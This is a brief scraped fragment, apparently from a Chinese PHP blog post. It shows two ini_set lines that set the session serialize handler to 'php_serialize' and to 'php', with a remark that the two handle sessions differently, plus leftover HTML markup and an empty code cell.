ini_set(&lsquo;session.serialize_handler&rsquo;, &lsquo;php_serialize&rsquo;);&nbsp;
ini_set(&lsquo;session.serialize_handler&rsquo;, &lsquo;php&rsquo;);&nbsp;
两者处理session的方式不同&nbsp;
</div><div id="MySignature"></div>

```{.python .input}

```
